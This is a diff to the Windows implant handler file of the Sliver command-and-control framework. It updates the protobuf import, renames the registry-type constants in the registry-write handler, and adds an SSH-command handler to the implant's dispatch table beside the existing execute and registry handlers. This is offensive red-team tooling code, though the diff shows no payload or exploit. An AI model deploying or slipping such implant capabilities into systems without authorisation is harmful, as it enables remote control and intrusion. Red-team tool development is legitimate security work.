@@ -37,8 +37,8 @@ import (
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
 
-	"github.com/golang/protobuf/proto"
 	"golang.org/x/sys/windows"
+	"google.golang.org/protobuf/proto"
 )
 
 var (
@@ -86,6 +86,7 @@ var (
 		sliverpb.MsgExecuteReq:           executeHandler,
 		sliverpb.MsgReconnectIntervalReq: reconnectIntervalHandler,
 		sliverpb.MsgPollIntervalReq:      pollIntervalHandler,
+		sliverpb.MsgSSHCommandReq:        runSSHCommandHandler,
 
 		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
@@ -436,13 +437,13 @@ func regWriteHandler(data []byte, resp RPCResponse) {
 	}
 	var val interface{}
 	switch regWriteReq.Type {
-	case sliverpb.RegistryType_BINARY:
+	case sliverpb.RegistryTypeBinary:
 		val = regWriteReq.ByteValue
-	case sliverpb.RegistryType_DWORD:
+	case sliverpb.RegistryTypeDWORD:
 		val = regWriteReq.DWordValue
-	case sliverpb.RegistryType_QWORD:
+	case sliverpb.RegistryTypeQWORD:
 		val = regWriteReq.QWordValue
-	case sliverpb.RegistryType_STRING:
+	case sliverpb.RegistryTypeString:
 		val = regWriteReq.StringValue
 	default:
 		return
